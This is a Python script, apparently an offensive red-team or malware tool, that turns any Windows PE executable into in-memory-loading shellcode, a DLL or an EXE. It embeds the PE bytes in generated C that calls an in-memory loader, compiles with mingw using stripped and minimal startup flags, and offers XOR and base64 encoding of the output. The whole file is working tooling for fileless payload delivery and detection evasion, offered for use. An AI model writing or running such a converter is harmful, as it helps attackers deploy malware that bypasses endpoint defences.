import os
import sys
import subprocess
import textwrap
import base64

if len(sys.argv) < 3:
    print(f"Usage: {os.path.basename(sys.argv[0])} <input_pe> <output.bin> [-exe|-dll] [-xor] [-b64]")
    sys.exit(1)

args = [arg.lower() for arg in sys.argv]

input_pe = sys.argv[1]
output_bin = sys.argv[2]
use_exe = "-exe" in args
use_dll = "-dll" in args
use_xor = "-xor" in args
use_b64 = "-base64" in args or "-b64" in args

with open(input_pe, "rb") as f:
    pe_bytes = f.read()

if len(pe_bytes) < 2 or pe_bytes[:2] != b"MZ":
    print("[-] Input is not a valid PE (missing MZ header)")
    sys.exit(1)

hex_array = ", ".join(f"0x{b:02x}" for b in pe_bytes)

c_source = textwrap.dedent(f"""
#include "pe_loader.h"

__attribute__((section(".text")))
unsigned char pe_blob[] = {{
    {hex_array} // x64 native PE bytes
}};

__attribute__((section(".text.start")))
void _start(void) {{
    ExecuteFromMemory(pe_blob);
}}
""")

output_file = output_bin if use_exe or use_dll else "temp_compile.exe"

compile_cmd = [
    "x86_64-w64-mingw32-gcc",
    "-x", "c", "-",
    "-nostdlib", "-nostartfiles", "-ffreestanding",
    "-Wl,-subsystem,windows", "-e", "_start",
    "-Os", "-s", "-fno-ident",
    "-fno-asynchronous-unwind-tables",
    "-mno-stack-arg-probe",
    "-o", output_file
]

if use_dll:
    compile_cmd.extend(["-shared", "-Wl,--exclude-all-symbols"])

if not use_exe and not use_dll:
    compile_cmd.extend(["-T", "linker.ld"])

if use_xor:
    compile_cmd.append("-DXOR")

try:
    subprocess.run(
        compile_cmd,
        input=c_source.encode(),
        check=True
    )

    if not use_exe and not use_dll:
        subprocess.run(
            ["objcopy", "-O", "binary", "--only-section=.text", output_file, output_bin],
            check=True
        )
        os.remove(output_file)

        if use_b64:
            with open(output_bin, "rb") as f:
                b = f.read()
            with open(output_bin, "w") as f:
                f.write(base64.b64encode(b).decode())
            print(f"[+] Shellcode generated (base64): {output_bin}")
        else:
            print(f"[+] Shellcode generated: {output_bin}")

    elif use_dll:
        if use_b64:
            with open(output_file, "rb") as f:
                b = f.read()
            with open(output_file, "w") as f:
                f.write(base64.b64encode(b).decode())
            print(f"[+] DLL generated (base64): {output_file}")
        else:
            print(f"[+] DLL generated: {output_file}")

    else:
        if use_b64:
            with open(output_file, "rb") as f:
                b = f.read()
            with open(output_file, "w") as f:
                f.write(base64.b64encode(b).decode())
            print(f"[+] Executable generated (base64): {output_file}")
        else:
            print(f"[+] Executable generated: {output_file}")

except subprocess.CalledProcessError:
    sys.exit(1)
